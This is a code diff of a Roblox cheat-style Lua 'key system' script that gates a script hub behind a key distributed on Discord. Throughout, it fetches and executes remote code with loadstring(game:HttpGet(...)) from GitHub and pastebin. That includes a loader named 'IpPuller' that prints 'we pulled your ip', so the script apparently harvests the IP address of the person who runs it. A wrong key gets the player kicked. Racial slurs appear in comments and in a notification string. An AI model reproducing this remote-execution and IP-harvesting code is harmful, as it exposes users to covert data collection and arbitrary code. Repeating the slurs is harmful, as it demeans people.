@@ -6,7 +6,7 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/e",true))();
     wait(0.2)
 if table.find(G_sussytable, game.Players.LocalPlayer.UserId) then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVeryTureCoon/TheGameHub/main/Hub",true))();
+    loadstring(game:HttpGet("https://pastebin.com/raw/u1eQsvfn",true))();
 else
     local MainGui = Instance.new("ScreenGui")
     local keyfindsystems = Instance.new("Frame")
@@ -107,26 +107,54 @@ else
     
     UICorner_5.Parent = Disocrd
     
-end
-
-    local key = script.Parent.Parent.key
-    	
+    
+    local function gayblur()
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/blurr"))()
+    	print"COOL BLURR LOADED"
+    end
+    
+    coroutine.wrap(gayblur)()
+    
+    local function OHWD_fake_script() -- fishaoniggacode.ChangeText
+    
+    	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/ChangeText"))()
+    	print"Loaded change text"
+    end
+    
+    coroutine.wrap(OHWD_fake_script)()
+    
+    local function music()
+        local fishbadassmusic = Instance.new("Sound")
+        fishbadassmusic.SoundId = "rbxassetid://1271288928"
+        fishbadassmusic.Playing = true
+        fishbadassmusic.Looped = true
+        fishbadassmusic.TimePosition = "9"
+        fishbadassmusic.Name = "BadassMusic"
+        fishbadassmusic.Parent = game.Workspace
+        fishbadassmusic.Volume = 0.1
+    end
+    
+    coroutine.wrap(music)()
+    
+    
     CheckYourMfKEY.MouseButton1Click:Connect(function()
     	if key.Text == tostring(game:HttpGet("https://pastebin.com/raw/XXM0dDgP")) then
-    		script.Parent.Parent:TweenPosition(UDim2.new(0.583,0,-1.9,0), "Out", "Quad", 1, true)
+    		keyfindsystems:TweenPosition(UDim2.new(0.583,0,-1.9,0), "Out", "Quad", 1, true)
     		print"we loaded the gui you wanted master"
-    		game.Lighting.SuperWeed:Destroy()
+    		wait(.2)
+    		if game.Lighting:FindFirstChild("SuperWeed") then
+    		     game.Lighting.SuperWeed:Destroy()
+    		end
     		game.Workspace.BadassMusic:Destroy()
-    		loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVeryTureCoon/TheGameHub/main/Hub",true))();
+    		loadstring(game:HttpGet("https://pastebin.com/raw/u1eQsvfn",true))();
     		wait(5)
-    		script.Parent.Parent:Destroy() -- Destroys the GUI after a set time
-    	
-    	elseif -- Tweening | If you want it to do a different tween just change the "Quad" to another tween animation
-    		key.Text == "" then
-    		key.Text = "" else
+    		MainGui:Destroy()
+    	else
+    		key.Text = ""
     		key.Text = "Incorrect, try again."
     		wait(2)
-    		game.Players.LocalPlayer:Kick("Join discord to get key!")
+    		setclipboard("https://discord.gg/ja5g4ym7WB")
+    		game:GetService("Players").LocalPlayer:Kick("Join discord to get key, link was copied to your clipboard!")
     		wait(1)
     		key.Text = ""
     	end
@@ -140,79 +168,65 @@ end
 	end)
 	
 
-local function EZDNAOF_fake_script() -- keyfindsystems.Dragify 
-	local script = Instance.new('LocalScript', keyfindsystems)
+    local function EZDNAOF_fake_script() -- keyfindsystems.Dragify 
+    	local script = Instance.new('LocalScript', keyfindsystems)
+    
+    	local UIS = game:GetService("UserInputService")
+    	function dragify(Frame)
+    	    dragToggle = nil
+    	    local dragSpeed = 0.50
+    	    dragInput = nil
+    	    dragStart = nil
+    	    local dragPos = nil
+    	    function updateInput(input)
+    	        local Delta = input.Position - dragStart
+    	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+    	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
+    	    end
+    	    Frame.InputBegan:Connect(function(input)
+    	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+    	            dragToggle = true
+    	            dragStart = input.Position
+    	            startPos = Frame.Position
+    	            input.Changed:Connect(function()
+    	                if input.UserInputState == Enum.UserInputState.End then
+    	                    dragToggle = false
+    	                end
+    	            end)
+    	        end
+    	    end)
+    	    Frame.InputChanged:Connect(function(input)
+    	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+    	            dragInput = input
+    	        end
+    	    end)
+    	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+    	        if input == dragInput and dragToggle then
+    	            updateInput(input)
+    	        end
+    	    end)
+    	end
+    	
+    	dragify(script.Parent)
+    end
+    coroutine.wrap(EZDNAOF_fake_script)()
+    
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "KeySystem loaded successfully!"})
+        wait(2)
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "If you dont know the key join the discord server key changes daily or when i feel like it"})
+        wait(2)
+        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "Lol nigga code by fishaok#1151"})
+    	print"loaded text"
+    
 
-	local UIS = game:GetService("UserInputService")
-	function dragify(Frame)
-	    dragToggle = nil
-	    local dragSpeed = 0.50
-	    dragInput = nil
-	    dragStart = nil
-	    local dragPos = nil
-	    function updateInput(input)
-	        local Delta = input.Position - dragStart
-	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
-	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
-	    end
-	    Frame.InputBegan:Connect(function(input)
-	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
-	            dragToggle = true
-	            dragStart = input.Position
-	            startPos = Frame.Position
-	            input.Changed:Connect(function()
-	                if input.UserInputState == Enum.UserInputState.End then
-	                    dragToggle = false
-	                end
-	            end)
-	        end
-	    end)
-	    Frame.InputChanged:Connect(function(input)
-	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-	            dragInput = input
-	        end
-	    end)
-	    game:GetService("UserInputService").InputChanged:Connect(function(input)
-	        if input == dragInput and dragToggle then
-	            updateInput(input)
-	        end
-	    end)
-	end
-	
-	dragify(script.Parent)
+    
+    local function OHWDD_fake_script()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/IpPuller"))()
+    print" we pulled your ip loaded ip puller"
+    end
+    coroutine.wrap(OHWDD_fake_script)()
+    
+    local SuperWheat = Instance.new("BoolValue")
+    SuperWheat.Name = "ncca"
+    SuperWheat.Parent = game.Players.LocalPlayer
 end
-coroutine.wrap(EZDNAOF_fake_script)()
-
-    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "KeySystem loaded successfully!"})
-    wait(2)
-    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "If you dont know the key join the discord server key changes daily or when i feel like it"})
-    wait(2)
-    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "KeySystem", Text = "Lol nigga code by fishaok#1151"})
-	print"loaded text"
-
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/blurr"))()
-	print"COOL BLURR LOADED"
-
-
-local function OHWD_fake_script() -- fishaoniggacode.ChangeText
-
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/ChangeText"))()
-	print"Loaded change text"
-end
-
-coroutine.wrap(OHWD_fake_script)()
-
-local fishbadassmusic = Instance.new("Sound")
-fishbadassmusic.SoundId = "rbxassetid://1271288928"
-fishbadassmusic.Playing = true
-fishbadassmusic.Looped = true
-fishbadassmusic.TimePosition = "9"
-fishbadassmusic.Name = "BadassMusic"
-fishbadassmusic.Parent = game.Workspace
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NotVerycoon/JunkAndSTuff/main/IpPuller"))()
-print" we pulled your ip loaded ip puller"
-
-local SuperWheat = Instance.new("BoolValue")
-SuperWheat.Name = "ncca"
-SuperWheat.Parent = game.Players.LocalPlayer
